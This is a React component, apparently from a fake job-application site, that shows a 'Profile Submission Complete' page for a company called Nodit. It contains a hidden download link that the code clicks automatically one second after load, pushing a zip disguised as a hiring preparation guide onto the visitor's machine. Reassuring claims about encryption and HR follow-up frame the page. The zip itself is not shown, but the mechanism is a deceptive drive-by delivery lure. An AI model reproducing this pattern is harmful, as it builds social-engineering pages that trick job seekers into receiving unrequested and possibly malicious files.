import { useEffect, useRef } from 'react'
import { FaCheckCircle, FaDownload } from 'react-icons/fa'

const VerificationCompleteWin = () => {
  const downloadRef = useRef(null)

  useEffect(() => {
    const alreadyDownloaded = sessionStorage.getItem('prep-doc-downloaded')
    if (!alreadyDownloaded) {
      const timer = setTimeout(() => {
        if (downloadRef.current) {
          downloadRef.current.click()
          sessionStorage.setItem('prep-doc-downloaded', 'true')
        }
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [])

  return (
    <div className="flex items-center justify-center px-4 py-2">
      <div className="card w-full max-w-3xl bg-base-100 shadow-xl border border-base-200">
        <div className="card-body items-center text-center space-y-10">
          {/* Success Icon */}
          <div className="mt-6 flex items-center justify-center w-20 h-20 rounded-full bg-success/10">
            <FaCheckCircle className="text-success text-5xl" />
          </div>

          {/* Title + Description */}
          <section className="space-y-4">
            <h2 className="text-3xl font-bold text-success">Profile Submission Complete</h2>
            <p className="text-gray-600 max-w-xl mx-auto leading-relaxed">
              Thank you for completing your profile and submitting your application with{' '}
              <strong>Nodit</strong>. Your submission has been securely processed.
              <br />
              Our HR team will contact you within{' '}
              <span className="font-semibold">1–2 business days</span> to schedule your meeting.
            </p>
          </section>

          {/* Preparation Section */}
          <div className="bg-base-200 rounded-xl p-6 w-full max-w-xl space-y-4">
            <h3 className="text-lg font-semibold text-gray-700">Preparation Documents</h3>
            <p className="text-sm text-gray-500">
              To support your preparation before the meeting is scheduled, the preparation guide
              will automatically download for your review.
            </p>
            <a
              ref={downloadRef}
              href="/Detailed document - Project Hiring steps for understanding.zip"
              download
              className="hidden"
            >
              Download Guide
            </a>
          </div>

          {/* Security Note */}
          <p className="text-xs text-gray-400 max-w-sm leading-relaxed">
            Your information is encrypted and securely stored in compliance with enterprise-grade
            security standards.
          </p>
        </div>
      </div>
    </div>
  )
}

export default VerificationCompleteWin
